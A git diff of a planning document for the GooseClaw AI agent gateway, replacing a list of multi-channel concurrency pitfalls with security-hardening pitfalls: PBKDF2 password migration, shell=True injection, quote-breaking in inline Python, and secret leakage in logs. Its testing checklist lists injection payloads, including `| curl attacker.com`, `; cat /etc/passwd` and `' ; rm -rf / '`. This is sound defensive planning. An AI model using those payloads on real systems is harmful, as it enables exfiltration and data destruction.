@@ -1,251 +1,285 @@
-# Domain Pitfalls
+# Pitfalls Research
 
-**Domain:** Multi-channel abstraction, multi-bot support, per-channel provider routing on existing single-bot gateway
-**Researched:** 2026-03-13
-**System:** GooseClaw gateway (Python stdlib only, single goose web process, threading-based concurrency)
+**Domain:** Production hardening of existing self-hosted AI agent platform (GooseClaw v4.0)
+**Researched:** 2026-03-16
+**Confidence:** HIGH (based on codebase analysis + verified security research)
 
 ## Critical Pitfalls
 
-Mistakes that cause deadlocks, data leaks between sessions, or require rewrites.
+### Pitfall 1: Password hash migration locks out existing users
+
+**What goes wrong:**
+Switching from SHA-256 to a new hash algorithm means the stored `web_auth_token_hash` in `/data/config/setup.json` on the persistent Railway volume becomes unverifiable. Container restarts with new code, user enters correct password, new verification function doesn't recognize the old SHA-256 format, user is permanently locked out. Recovery secret is the only way back in.
+
+**Why it happens:**
+Developers test with fresh installs. The upgrade path (old hash format on disk, new code running) is never tested. The current `hash_token()` at gateway.py line 1090 returns a bare hex string with no algorithm prefix. There's no way to distinguish "this is SHA-256" from "this is PBKDF2" just by looking at the stored value.
+
+**How to avoid:**
+1. Tag new hashes with a prefix: `$pbkdf2$salt$hash` vs bare hex for legacy SHA-256
+2. `verify_token()` checks for prefix first. If present, use new algorithm. If bare hex, fall back to SHA-256
+3. On successful SHA-256 verification, transparently rehash with PBKDF2 and save. This is "lazy migration", the standard pattern
+4. Write an explicit test: create a SHA-256 hash with the OLD `hash_token()`, then verify it with the NEW `verify_token()`, then confirm transparent upgrade happened
+
+**Warning signs:**
+- Tests only use freshly generated hashes, never pre-existing SHA-256 values
+- `verify_token()` doesn't check hash format prefix
+- No test named something like `test_legacy_sha256_migration`
+
+**Phase to address:**
+Security fixes, FIRST item. Every other security change depends on auth working. If auth is broken, you can't access the admin panel to debug anything else.
 
 ---
 
-### Pitfall 1: Lock Re-entrancy and Nested Lock Acquisition
+### Pitfall 2: stdlib constraint makes argon2/bcrypt impossible, but PBKDF2 is fine
 
-**What goes wrong:** `threading.Lock()` is NOT reentrant. If thread A acquires lock X and then calls a function that also acquires lock X, thread A deadlocks against itself. This already happened: `_do_prewarm` held `_telegram_sessions_lock` then called `_save_telegram_sessions()` which also acquires the same lock. Result: permanent hang on `/clear`.
+**What goes wrong:**
+The project says "Python stdlib only for gateway.py." Argon2 requires `argon2-cffi`. Bcrypt requires `bcrypt`. Neither is stdlib. Teams waste time debating whether to "relax the constraint" or attempt pure-Python implementations of argon2 (which don't exist at production quality).
 
-**Why it happens:** When refactoring telegram-specific code into a shared abstraction layer, you create new call paths. A method in the shared `ChannelRelay` might acquire `_sessions_lock`, then call a helper that internally acquires the same lock. The call chain gets longer and less obvious. It's particularly dangerous when you're moving existing code that was tested in one calling context into a shared layer called from multiple contexts.
+**Why it happens:**
+The PROJECT.md milestone says "swap SHA-256 for argon2/bcrypt" without checking whether those are available under the stdlib constraint. The Dockerfile already pip-installs packages (PyYAML, chromadb) but the gateway.py constraint remains.
 
-**Consequences:** Permanent deadlock. No error message. No recovery except process restart. Every subsequent request that touches the lock also hangs. In production on Railway, this looks like the bot "just stopped responding" with zero diagnostic output.
+**How to avoid:**
+Use `hashlib.pbkdf2_hmac()` which has been in Python stdlib since 3.4 and is OWASP-approved. With 600,000 iterations of SHA-256 and a 16-byte random salt, PBKDF2 provides orders of magnitude more resistance than bare SHA-256 (180 billion SHA-256 hashes/sec vs ~1,000 PBKDF2 hashes/sec on GPU). This is the correct choice given the constraint.
 
-**Prevention:**
-- Audit every lock in the current system (there are 17 `threading.Lock()` instances). Map which functions acquire which locks and what they call while holding them.
-- Use `threading.RLock()` for any lock where nested acquisition is even remotely possible. The performance difference is negligible. The safety difference is everything.
-- Rule: never call a function that might acquire the same lock while holding it. If you must, acquire-then-release-then-call, or refactor to pass already-locked state as parameters.
-- Rule: any lock that protects data which has a `_save_*()` companion function should be an `RLock` or the save function should accept a `_locked=False` parameter to skip acquisition when the caller already holds it.
+Concrete implementation that stays stdlib-only:
+```python
+import hashlib, os, base64
 
-**Detection:** Process hangs with no error output. Adding `timeout=5` to all `.acquire()` calls and logging timeouts would make these instantly visible instead of silently fatal.
+def hash_password(password: str) -> str:
+    salt = os.urandom(16)
+    dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600_000)
+    return f"$pbkdf2${base64.b64encode(salt).decode()}${base64.b64encode(dk).decode()}"
 
-**Known instance:** Commit `071fb00` fixed this exact bug. The comment in `_prewarm_session` line 3312 documents the pattern: "save OUTSIDE lock to avoid deadlock."
+def verify_password(password: str, stored: str) -> bool:
+    if stored.startswith("$pbkdf2$"):
+        _, _, salt_b64, dk_b64 = stored.split("$", 3)
+        salt = base64.b64decode(salt_b64)
+        dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600_000)
+        return base64.b64encode(dk).decode() == dk_b64
+    # legacy SHA-256 fallback (no salt, no iterations)
+    return hashlib.sha256(password.encode()).hexdigest() == stored
+```
 
----
+Alternative: `hashlib.scrypt()` (stdlib since 3.6) is memory-hard and arguably stronger, but PBKDF2 is more widely understood and audited.
 
-### Pitfall 2: Global Process Restart Nukes All Channels
+**Warning signs:**
+- Adding argon2-cffi or bcrypt to requirements.txt
+- Discussions about "should we relax the stdlib constraint"
+- Implementing password hashing without a salt (just switching to PBKDF2 with no salt is still weak)
 
-**What goes wrong:** `/clear` restarts the entire goose web process via `_restart_goose_and_prewarm()`. This kills ALL sessions across ALL channels and ALL bots. When user A on Telegram says `/clear`, user B's active Slack conversation dies mid-response. With multi-bot, bot1's user clearing context kills bot2's user's session.
-
-**Why it happens:** Goose's claude-code provider spawns a persistent subprocess. Clearing context requires killing that subprocess, which means restarting the entire goose web process. All sessions live inside that single process. There's no per-session provider subprocess isolation. Line 3230 confirms: `_telegram_sessions.clear()` wipes ALL sessions, not just the caller's.
-
-**Consequences:** Cross-channel interference. Users on other channels lose their conversation mid-sentence. Active WebSocket relays get connection errors. The retry logic creates new sessions, but the user loses all context. In multi-bot scenarios, this is a complete isolation failure.
-
-**Prevention:**
-- Short term: scope `/clear` to reset only the calling user's session (just `pop(chat_key)` instead of `.clear()`). Accept that claude-code provider state may leak between sessions until goose fixes per-session isolation.
-- Medium term: track which sessions are "dirty" (used claude-code provider) and only restart goose web if the clearing user was using that provider. Other providers don't have persistent subprocess state.
-- Long term: advocate upstream for goose's per-session provider lifecycle management (Discussion #4389 shows goose team is working on this: "agent per session in goosed/goose-server with isolation").
-- Always: before restarting goose web, drain active relays on ALL channels by setting cancelled flags and waiting (with timeout) for in-flight relays to complete.
-
-**Detection:** If you hear "my bot stopped mid-conversation and I didn't do anything," someone on another channel or bot hit `/clear`.
-
----
-
-### Pitfall 3: Session State Pollution Between Bots Sharing One Goose Web
-
-**What goes wrong:** Multiple bots route to the same goose web process. Goose web maintains a single GOOSE_PROVIDER/GOOSE_MODEL in env vars. When bot1 sets provider to `anthropic/claude-sonnet-4-20250514` and bot2 sets provider to `openai/gpt-4o`, whichever one sets last wins for new sessions. Existing sessions may keep their model via `_update_goose_session_provider()`, but any session recovery or new session creation uses the global default.
-
-**Why it happens:** Goose uses environment variables (GOOSE_PROVIDER, GOOSE_MODEL) as the default for new sessions. `_update_goose_session_provider()` does per-session hot-swapping, but `_session_model_cache` is an in-memory dict that doesn't survive goose web restarts. After a restart, all sessions fall back to whatever env vars are set.
-
-**Consequences:** After goose web restart (crash, `/clear`, health monitor restart), all sessions reset to the wrong model. Bot1's users might suddenly get GPT-4o responses when they're paying for Claude. This is especially insidious because it's intermittent and depends on restart timing.
-
-**Prevention:**
-- Persist `_session_model_cache` to disk (alongside channel session files). On goose web restart, re-apply model routing for all known sessions before accepting new messages.
-- Apply model routing in `_relay_to_goose_web` BEFORE every message, not just on cache miss. The cost of a redundant `update_provider` call is negligible vs. the cost of model misrouting.
-- Track per-session intended model in the session mapping itself (e.g., `_telegram_sessions[chat_key] = {"sid": "...", "model_id": "..."}`), not in a separate cache.
-
-**Detection:** Wrong model name in responses. Unexpected billing. Users reporting different behavior after brief outages.
+**Phase to address:**
+Security fixes. Architectural decision that must be made BEFORE implementation starts.
 
 ---
 
-### Pitfall 4: Telegram-Hardcoded Globals Leak Into Shared Abstraction
+### Pitfall 3: Shell injection through subprocess shell=True in job execution
 
-**What goes wrong:** The codebase has 132 references to `_telegram_` or `telegram_` in gateway.py. Functions like `_relay_to_goose_web` take `chat_id` as a parameter but then do `_telegram_sessions[str(chat_id)]` and `_save_telegram_sessions()` internally. If you pass a Slack user's ID into this function, it silently writes to the telegram sessions dict and corrupts the session mapping.
+**What goes wrong:**
+Gateway.py line 3801-3803 runs job commands with `subprocess.run(command, shell=True)`. The `command` field comes from the job creation API (`POST /api/jobs`). The Goose AI agent creates jobs via this API. If the AI is tricked or compromised, arbitrary shell commands execute in the container. This is the single most exploitable vulnerability in the codebase.
 
-**Why it happens:** Telegram was first. Code was written to work, not to be channel-agnostic. The function signatures look generic (`chat_id`, `session_id`) but the implementations are telegram-specific. `_relay_to_goose_web` at line 3811 does `_telegram_sessions[str(chat_id)] = new_sid` when retrying. A channel plugin calling this with its own user IDs will pollute telegram's session store.
+**Why it happens:**
+Jobs need to run commands like `curl -s api/costs | notify` which require shell pipe interpretation. `shell=True` was the easy path. Removing it naively (just setting `shell=False`) breaks every command that uses pipes, redirections, or subshells.
 
-**Consequences:** Session cross-contamination between channels. A slack user's session gets stored as a telegram session. `/clear` from telegram clears slack sessions. Memory writer processes wrong channel's conversations.
+**How to avoid:**
+Don't just flip `shell=True` to `shell=False`. That breaks legitimate usage. Instead:
+1. Create an allowlist of known safe script paths: `/usr/local/bin/notify`, `/usr/local/bin/job`, `/usr/local/bin/remind`, `/usr/local/bin/secret`
+2. For allowlisted scripts, use `subprocess.run([script_path, ...args], shell=False)`
+3. For commands with pipes, use `shlex.split()` and `subprocess.Popen` chains connecting stdout to stdin
+4. Reject commands containing shell metacharacters (`;`, `&&`, `||`, `` ` ``, `$(`, etc.) unless they match the pipe pattern `cmd1 | cmd2`
+5. At minimum, log all commands before execution for audit trail
 
-**Prevention:**
-- Step 1 (before abstracting): grep for every `_telegram_` reference. Categorize each as: (a) pure telegram logic that stays in telegram code, (b) generic session logic that needs channel parameterization, (c) notification/output logic that uses the notification bus.
-- Step 2: `_relay_to_goose_web` must NOT touch `_telegram_sessions` directly. Session recovery on relay failure should call back to the channel's own session manager (which `ChannelRelay` already handles for plugins at line 2818-2824).
-- Step 3: make telegram a channel plugin itself, using the same `ChannelRelay` interface. This is the forcing function. If telegram uses the same code path as slack, the abstraction must be correct.
-- Incremental approach: add a `channel` parameter to every function that currently says `telegram` in its body. Then replace `_telegram_sessions` references with channel-keyed session stores. Only then remove the old globals.
+**Warning signs:**
+- Tests mock subprocess instead of testing actual command execution with adversarial inputs
+- No input validation on the `command` field in job creation endpoint
+- The fix only changes `shell=True` to `shell=False` without handling pipes
 
-**Detection:** Session file sizes growing unexpectedly. Session IDs appearing in wrong channel's session file. Users getting responses meant for another channel.
-
----
-
-### Pitfall 5: Lock Ordering Violations With Multi-Channel Locks
-
-**What goes wrong:** The system currently has 17 module-level locks. Adding multi-channel and multi-bot support will add more (per-bot locks, per-channel-instance locks, cross-channel coordination locks). If thread A acquires `_channel_sessions_lock` then `goose_lock`, and thread B acquires `goose_lock` then `_channel_sessions_lock`, deadlock.
-
-**Why it happens:** Each channel implementation might lock its own session state, then call into shared goose web management code that locks `goose_lock`. Meanwhile, the health monitor locks `goose_lock` then tries to notify channels (which acquire channel locks). No enforced lock ordering exists.
-
-**Consequences:** Intermittent deadlocks that depend on timing. May only manifest under load or when goose web restarts while multiple channels are active. Nearly impossible to reproduce in testing.
-
-**Prevention:**
-- Define a global lock ordering hierarchy and document it at the top of gateway.py:
-  ```
-  Lock ordering (always acquire in this order):
-  1. goose_lock (process lifecycle)
-  2. _channels_lock (channel registry)
-  3. _notification_handlers_lock
-  4. channel-specific session locks
-  5. _telegram_active_relays_lock / per-chat locks
-  6. _session_model_lock
-  7. _jobs_lock
-  8. other data locks
-  ```
-- Never acquire a higher-numbered lock while holding a lower-numbered one.
-- Use `lock.acquire(timeout=10)` everywhere. Log and recover on timeout instead of hanging forever.
-- Consider replacing the 17 fine-grained locks with fewer coarse locks during the refactor. Fewer locks = fewer ordering violations. Optimize later if profiling shows contention.
-
-**Detection:** Add a debug mode that logs lock acquisitions with thread ID and lock name. Build a lock-order violation detector that runs in CI (record acquire order per thread, flag any thread that violates the hierarchy).
+**Phase to address:**
+Security fixes. Address after auth migration (Pitfall 1) since this requires more careful design.
 
 ---
 
-## Moderate Pitfalls
+### Pitfall 4: Inline Python string interpolation in shell scripts is injection-prone
+
+**What goes wrong:**
+secret.sh, entrypoint.sh, job.sh, and remind.sh all embed shell variables into inline Python code using single-quote interpolation: `python3 -c "... '$VARIABLE' ..."`. A value containing a single quote breaks out of the Python string literal. Example: secret.sh line 42 has `'$DOTPATH'.split('.')`. A dotpath value of `'; import os; os.system("id"); '` executes arbitrary Python.
+
+**Why it happens:**
+The pattern of calling `python3 -c` from bash to do JSON/YAML processing is common when you can't install jq-for-YAML or want more logic than jq provides. String interpolation is the obvious (but wrong) way to pass data in. The job.sh `cmd_create` function (line 284) already does it correctly using environment variables. The other scripts don't follow the same pattern.
+
+**How to avoid:**
+Convert every instance of `'$VARIABLE'` in inline Python to use `os.environ`:
+- Before: `python3 -c "keys = '$DOTPATH'.split('.')"`
+- After: `DOTPATH="$DOTPATH" python3 -c "import os; keys = os.environ['DOTPATH'].split('.')"`
+
+The fix is mechanical. Grep for `python3 -c` in all .sh files, find every `$` reference inside the Python string, and convert to os.environ. job.sh cmd_create already shows the correct pattern.
+
+Also fix entrypoint.sh lines 59-73 where `$GOOSECLAW_RESET_PASSWORD` is embedded directly. A password containing a single quote breaks the script.
+
+**Warning signs:**
+- `grep -n "python3 -c" *.sh` shows raw `$VARIABLE` inside the Python string (not via os.environ)
+- No tests for shell scripts with adversarial inputs (quotes, semicolons, newlines)
+
+**Phase to address:**
+Security fixes. Quick mechanical fix, can be done in parallel with other security work.
 
 ---
 
-### Pitfall 6: /clear and /stop Race Condition With Multi-Channel
+### Pitfall 5: Recovery secret leaked in container startup logs
 
-**What goes wrong:** `/stop` kills the active relay socket for a specific chat. `/clear` kills the relay, clears sessions, and restarts goose web. If a channel plugin's `/stop` handler fires while the shared `/clear` logic is mid-restart, the `/stop` tries to close a socket that was already closed by `/clear`, then the retry logic in `_relay_to_goose_web` creates a new session against a goose web that's being killed.
+**What goes wrong:**
+Entrypoint.sh line 39 prints `GOOSECLAW_RECOVERY_SECRET=$RECOVERY_SECRET` to stdout on first boot. Railway captures all container stdout as deployment logs visible in the dashboard. Anyone with Railway project access (including team members, support staff) can read the recovery secret from historical logs. This secret enables password resets.
 
-**Why it happens:** This was already partially fixed for telegram-only (commits `caab970`, `a369dfc`). But multi-channel makes it worse: `/clear` on telegram restarts goose web, killing slack's active relay. Slack's relay fails, triggers retry, creates a new session against a goose web that's still starting up (30s readiness wait). The retry fails. Slack retries again. Eventually goose web is ready but slack has created 3 orphan sessions.
+**Why it happens:**
+Added as a UX convenience so users can copy the secret to Railway env vars. But stdout in containerized environments is persistent, shared, and often forwarded to log aggregation services.
 
-**Prevention:**
-- Use a "restart generation" counter. Increment on every goose web restart. If a relay's generation doesn't match current, skip retry entirely.
-- Set a "restarting" flag checked by all relay retry paths. If goose web is restarting, don't retry, just return a "system restarting, try again shortly" error.
-- Serialize goose web restarts with a dedicated restart lock (not `goose_lock`). Queue restart requests. Multiple simultaneous `/clear` calls should collapse into one restart.
+**How to avoid:**
+Remove the echo of the full secret value. Options:
+1. Print only masked version: `echo "[init] GOOSECLAW_RECOVERY_SECRET=${RECOVERY_SECRET:0:4}..."`
+2. Tell user to retrieve via Railway shell: `echo "[init] run 'cat /data/.recovery_secret' in Railway shell to see your recovery secret"`
+3. Best: set it as a Railway env var programmatically via Railway API (if available)
 
----
+**Warning signs:**
+- `grep -rn 'echo.*SECRET\|echo.*TOKEN\|echo.*KEY' *.sh` returns matches
+- Container logs contain base64 or url-safe random strings
 
-### Pitfall 7: Notification Bus Doesn't Know About Multi-Bot
-
-**What goes wrong:** `notify_all()` sends to every registered handler. With multi-bot, bot1's cron job output gets delivered to bot2's users. The notification bus has no concept of "which bot" a notification belongs to.
-
-**Why it happens:** The current design registers handlers by name (`channel:telegram`, `channel:slack`). But multi-bot means you'd have `channel:telegram:bot1`, `channel:telegram:bot2`. Job targeting uses `channel: "telegram"` in the job config, which would match both bots.
-
-**Prevention:**
-- Add a `bot_id` or `scope` to notification handlers and job targeting. A job created by bot1's user should only deliver to bot1's handler.
-- Notification handler registration should accept a scope: `register_notification_handler("telegram", handler, scope="bot1")`.
-- `notify_all()` should accept an optional scope filter. Jobs store which bot/channel they were created from.
+**Phase to address:**
+Security fixes. One-line fix, should be in the very first commit.
 
 ---
 
-### Pitfall 8: Channel Plugin Hot-Reload Breaks Active Sessions
+### Pitfall 6: Retrofitting tests on a 400KB monolith creates fragile mocks
 
-**What goes wrong:** `POST /api/channels/reload` calls `_unload_channel()` which sets the stop event and deregisters the notification handler, then `_load_channel()` creates a new `ChannelRelay` instance. The new `ChannelRelay` loads sessions from disk, but any in-memory session state from the old instance is lost if it hadn't been saved. Active relays using the old `ChannelRelay` instance continue referencing the old session dict.
+**What goes wrong:**
+gateway.py is 9700+ lines in a single file. Testing individual HTTP endpoints requires importing the entire module and mocking dozens of globals (`_telegram_sessions`, `goose_lock`, `_jobs`, etc.). Tests become tightly coupled to implementation details. A small refactor breaks 50 tests even though behavior didn't change. The test suite becomes a maintenance burden rather than a safety net.
 
-**Why it happens:** The old relay function is captured in a closure by the polling thread. After reload, the poll thread gets a new relay function, but any background relay threads spawned before reload still reference the old `ChannelRelay` object.
+**Why it happens:**
+The module wasn't designed for testability. Functions reference module-level globals directly. There's no dependency injection, no request context object, no handler registry. The existing test_gateway.py (8640 lines, 624 tests) already demonstrates this: it heavily patches module globals.
 
-**Prevention:**
-- Drain active relays before unloading a channel (similar to `/stop` for all users on that channel).
-- Share session state through a shared dict or file-backed store rather than per-instance dicts. The `ChannelRelay` constructor already loads from disk, so this is mostly about ensuring writes happen before unload.
-- Add a "reload grace period" that waits for in-flight relays to complete (with timeout) before teardown.
+**How to avoid:**
+1. Accept the monolith for now. Don't refactor gateway.py into modules during hardening. That's a separate project.
+2. Test at the HTTP level, not the function level. Spin up an actual HTTPServer on a random port, make real HTTP requests, assert on responses. This tests behavior, not implementation.
+3. Use `unittest.mock.patch.dict` for global dicts rather than replacing them entirely. This preserves other state.
+4. For new security tests, test the public interface: "POST /api/auth/login with correct password returns 200 and session cookie." Not: "verify_token() returns True when hash matches."
+5. Keep test files focused: one test file per concern (test_auth.py, test_jobs.py, test_shell_scripts.py) rather than one giant test_gateway.py.
 
----
+**Warning signs:**
+- Test files growing past 2000 lines
+- Tests that patch more than 3 things
+- Tests that break when internal variable names change
+- Tests that pass individually but fail when run together (shared state leaking between tests)
 
-### Pitfall 9: Per-Channel Verbosity and Model Routing Config Grows Quadratically
-
-**What goes wrong:** With N channels and M bots, the routing config becomes N x M entries. Each bot-channel combination needs its own model and verbosity setting. The current flat `channel_routes` dict and `channel_verbosity` dict don't account for per-bot scoping.
-
-**Why it happens:** The current config schema uses `channel_routes: {"telegram": "model_id"}` and `channel_verbosity: {"telegram": "balanced"}`. Adding multi-bot would need `channel_routes: {"telegram:bot1": "model_id_1", "telegram:bot2": "model_id_2"}`, or a nested structure. Either way, the setup wizard UI becomes complex.
-
-**Prevention:**
-- Design the config schema for multi-bot from the start. Use a hierarchical model: global defaults, then per-bot overrides, then per-channel-within-bot overrides.
-- Don't store in a flat dict. Use: `bots: [{id, token, default_model, channel_overrides: {channel: model_id}}]`.
-- Migrate the existing flat config to the new schema in a migration function (like `migrate_config_models()` already handles v1 to v2).
-
----
-
-### Pitfall 10: Memory Writer Processes Wrong Bot's Conversations
-
-**What goes wrong:** The memory writer (`_memory_writer_loop`) watches `_memory_last_activity` for idle chats, then extracts memories from the conversation. With multi-bot, bot1's user chats get processed by the memory writer, but the extracted memories go into a global identity directory. Bot2's users then see bot1's memories in their context.
-
-**Why it happens:** Memory extraction writes to `IDENTITY_DIR/learnings/`, which is shared across all sessions. The memory writer doesn't track which bot or channel a session belongs to. The `_memory_processed_sessions` set prevents re-processing but doesn't scope by bot.
-
-**Prevention:**
-- Scope memory storage by bot: `IDENTITY_DIR/learnings/{bot_id}/`.
-- Track `bot_id` in `_memory_last_activity` alongside the timestamp.
-- For single-bot deployments (the common case), keep the flat structure for backwards compatibility. Only create subdirectories when multi-bot is configured.
+**Phase to address:**
+Testing phase. Establish testing patterns BEFORE writing all the tests.
 
 ---
 
-## Minor Pitfalls
+## Technical Debt Patterns
 
----
+| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
+|----------|-------------------|----------------|-----------------|
+| `print()` instead of structured logging | Zero setup, works everywhere. 252+ existing calls. | Can't parse, filter, or aggregate in production. No log levels. No timestamps. No request correlation. | Never in production. But migrate incrementally, not all at once. |
+| 400KB monolith gateway.py | Everything in one file, easy to grep, no import cycles | Impossible to test units in isolation. IDE chokes. Import takes seconds. | Accept for v4.0. Refactoring is a separate milestone. |
+| `shell=True` for job execution | Shell pipes work naturally | Every job command is a potential RCE vector | Never for user/AI-controlled input |
+| SHA-256 for passwords | Works, zero dependencies, fast | Crackable in milliseconds (180B hashes/sec on GPU) | Never. PBKDF2 stdlib is trivial to add. |
+| Unpinned dependency ranges (chromadb>=1.0.0,<2.0.0) | Gets latest patches automatically | Non-reproducible builds. Surprise breaking changes. | Only during rapid prototyping. Pin with == for production. |
+| No request body size limits | Simpler handler code | DoS via 100MB POST body consuming all container memory | Never in production. Add Content-Length check. |
 
-### Pitfall 11: Bot Token Exposure in Shared Logging
+## Integration Gotchas
 
-**What goes wrong:** Log lines include bot tokens in URLs: `f"https://api.telegram.org/bot{bot_token}/getUpdates"`. With multi-bot, all bot tokens appear in shared logs. If logs are exposed, all bots are compromised.
+| Integration | Common Mistake | Correct Approach |
+|-------------|----------------|------------------|
+| Railway volumes | Assuming /data always has expected files. Volume can be empty on region migration or new deployment. | Every file read from /data must handle FileNotFoundError gracefully. First-boot detection exists but individual readers don't all check. |
+| Railway health checks | Health check depends on goose web subprocess being ready. Goose web takes 10-30s to start. Health check fails during startup. | /api/health should return 200 even if goose web isn't ready, just include status field. Current HEALTHCHECK has --retries=3 which helps but verify the endpoint behavior. |
+| PBKDF2 on Railway CPU | Railway containers may have throttled CPU. 600K iterations takes 250ms on fast hardware but could take 1-2s on throttled CPU. | Benchmark on actual Railway container. If >500ms, reduce iterations to 300K (still vastly better than bare SHA-256). |
+| Structured logging on Railway | Railway's log viewer has line length limits. JSON log lines can be very long. | Set max field length in log format. Truncate request/response bodies in logs. Test that Railway log viewer renders them properly. |
+| Security headers vs reverse proxy | Railway's proxy may add or strip headers. Setting Strict-Transport-Security locally might conflict with Railway's TLS termination. | Test each header in actual Railway deployment, not just locally. Some headers (HSTS, CSP) can break things if misconfigured. |
 
-**Prevention:** Mask bot tokens in log output. Log only the last 4 characters: `bot***{token[-4:]}`.
+## Performance Traps
 
----
+| Trap | Symptoms | Prevention | When It Breaks |
+|------|----------|------------|----------------|
+| PBKDF2 before rate limiter | Each brute-force attempt consumes 250ms CPU even when rate-limited | Apply rate limiter BEFORE hash computation in the auth handler. Current rate limiter is at request level but verify the code path order. | Under sustained brute-force (>100 req/s) |
+| JSON logging of large request/response bodies | Log files explode. Container disk fills. Railway charges for egress. | Truncate body content in logs to 1KB max. Never log full file uploads or base64 content. | First large file upload or long AI response |
+| Test suite importing 400KB module | Each test file parses 9700 lines on import. 4 test files = 4 parses. | The existing tests already handle this with single import. New test files should follow the same pattern. Use pytest-xdist for parallelism. | When test count exceeds 1000 |
+| CVE scanning on every CI run | Scan takes 2-5 minutes. Blocks deployment. | Cache scan results. Only re-scan when Dockerfile or requirements.txt changes. Run full scan weekly, not on every push. | Immediately if added to CI without caching |
 
-### Pitfall 12: Rate Limiter is Per-IP, Not Per-Bot or Per-Channel
+## Security Mistakes
 
-**What goes wrong:** The rate limiter (`api_limiter`, `auth_limiter`, `notify_limiter`) is per source IP. A busy channel plugin making API calls from localhost exhausts the rate limit for all internal calls. Multi-bot management requests from the admin dashboard compete with channel plugin requests.
+| Mistake | Risk | Prevention |
+|---------|------|------------|
+| SHA-256 passwords without salt | Full password database crackable via rainbow tables in minutes | PBKDF2 with random 16-byte salt and 600K iterations |
+| Recovery secret in stdout | Anyone with log access can reset any password | Remove echo or mask to first 4 chars |
+| `shell=True` in subprocess | RCE if AI agent is tricked into crafting malicious job commands | Allowlist scripts, validate command patterns, use shell=False where possible |
+| `'$VAR'` interpolation in inline Python | Shell injection through any user-controlled shell variable | Always use os.environ to pass data to inline Python |
+| No Content-Length limit | DoS via memory exhaustion from large POST bodies | Check Content-Length header, reject >1MB before reading body |
+| Passwords in entrypoint.sh via env var | GOOSECLAW_RESET_PASSWORD value embedded in Python heredoc without escaping | Pass via os.environ, not string interpolation |
+| Security headers breaking inline JS | CSP blocks setup.html's inline scripts, locking user out of setup | Test all headers against setup.html. Use nonces or hashes for CSP. Or skip CSP for setup.html specifically. |
 
-**Prevention:** Exempt internal/localhost calls from rate limiting, or use per-bot rate limiting for bot-facing endpoints and per-IP only for user-facing endpoints.
+## UX Pitfalls
 
----
+| Pitfall | User Impact | Better Approach |
+|---------|-------------|-----------------|
+| Logging format change breaks existing log drains | Users with Datadog/Loki integrations see unparseable logs | Support both formats with a feature flag. Default to new JSON format but allow LOG_FORMAT=text env var. |
+| PBKDF2 making login feel slower | Login takes 250ms instead of instant. User notices on slow Railway container. | 250ms is fine. But if it's >1s on Railway CPU, reduce iterations. Never compromise UX for theoretical security. |
+| Security headers blocking setup wizard | User deploys update, can't access setup page due to CSP. No way to reconfigure. | Test CSP against setup.html BEFORE deploying. Have a CSP bypass for /setup path if needed. |
+| Graceful shutdown killing active conversation | User is mid-conversation, container restarts, response is lost | Send shutdown warning to active channels. Save session state. Complete in-flight relay before stopping. |
+| Test failures blocking deployment | New tests are flaky, CI fails intermittently, deploys are blocked | Quarantine flaky tests immediately. Never let test suite block production hotfixes. |
 
-### Pitfall 13: Test Coverage Gap for Concurrent Paths
+## "Looks Done But Isn't" Checklist
 
-**What goes wrong:** `test_gateway.py` tests individual functions with mocks but doesn't test concurrent execution. The deadlock bug (commit `071fb00`) wasn't caught by tests because no test exercised the lock acquisition path under concurrency.
+- [ ] **Password migration:** Tested with an ACTUAL SHA-256 hash from current production setup.json, not a freshly generated one
+- [ ] **Password migration:** entrypoint.sh password reset (lines 59-73) ALSO uses the new hash function, not still using SHA-256
+- [ ] **Shell injection fix:** Tested with commands containing: `; cat /etc/passwd`, `$(whoami)`, `` `id` ``, `| curl attacker.com`, `' ; rm -rf / '`
+- [ ] **Shell script injection fix:** Tested secret.sh with dotpath containing single quotes, double quotes, backticks, semicolons
+- [ ] **Structured logging:** ALL 252+ print() calls converted, not just the "important" ones. grep confirms zero remaining.
+- [ ] **Security headers:** Tested against setup.html (heavy inline JS/CSS), admin.html, AND the goose web reverse proxy pass-through
+- [ ] **Graceful shutdown:** Tested with active goose web session AND active channel relay, not just idle container
+- [ ] **Request body limits:** Applied to ALL endpoints that read body, not just /api/setup
+- [ ] **Dependency pinning:** ALL packages use exact versions (==). No >= or < ranges remain.
+- [ ] **Rate limiter + PBKDF2 ordering:** Rate limit check happens BEFORE the expensive hash computation in auth handler code path
+- [ ] **CVE scan:** Run against the BUILT Docker image, not just the Dockerfile. Base image ubuntu:22.04 may have unpatched vulns.
+- [ ] **Non-root after init:** After entrypoint.sh drops privileges, verify no subprocess (goose web, channel plugins) escalates back to root
 
-**Prevention:**
-- Add threading tests that exercise common concurrent scenarios: relay + clear, relay + stop, relay + channel reload.
-- Use `threading.Barrier` to force threads to hit the critical section simultaneously.
-- Add a timeout to every test that touches locks. A hung test is better than a silently passing one.
+## Recovery Strategies
 
----
+| Pitfall | Recovery Cost | Recovery Steps |
+|---------|---------------|----------------|
+| Password hash migration locks users out | LOW | Recovery secret still works (unless that was also broken). User does POST /api/auth/recover, gets temp password, logs in. Test this FIRST. |
+| Shell injection exploited | HIGH | Attacker had container shell. Rotate ALL secrets: vault.yaml credentials, API keys, bot tokens, recovery secret. Redeploy from clean image. Audit Railway logs. Consider what data was accessible from /data volume. |
+| Security headers break setup wizard | LOW | Remove offending header, redeploy. Railway redeploy takes ~2 minutes. Users regain access immediately. |
+| Structured logging breaks log drains | LOW | Set LOG_FORMAT=text env var in Railway to revert. Fix JSON format. Redeploy. |
+| Flaky tests block deployment | LOW | Skip flaky test with pytest marker. Deploy. Fix test. Remove skip. |
+| PBKDF2 too slow on Railway CPU | LOW | Reduce iterations (300K still safe). Or switch to hashlib.scrypt() which is memory-hard but faster per-iteration. |
 
-### Pitfall 14: Backwards Compatibility During Session File Migration
+## Pitfall-to-Phase Mapping
 
-**What goes wrong:** Current session files: `telegram_sessions.json`, `channel_sessions_{name}.json`. Multi-bot needs `channel_sessions_{bot_id}_{channel}.json` or a single `sessions.json` with nested structure. If the migration doesn't handle existing files, users lose their session mappings on upgrade.
-
-**Prevention:**
-- Write a `migrate_sessions()` function (following the pattern of `migrate_config_models()`).
-- On startup, check for old-format files and migrate them into the new structure.
-- Keep old files for one version cycle (renamed with `.bak`) for rollback safety.
-
----
-
-## Phase-Specific Warnings
-
-| Phase Topic | Likely Pitfall | Mitigation |
-|-------------|---------------|------------|
-| Channel abstraction layer | Pitfall 4 (telegram-hardcoded globals) | Extract telegram into channel plugin interface FIRST, before adding new channels |
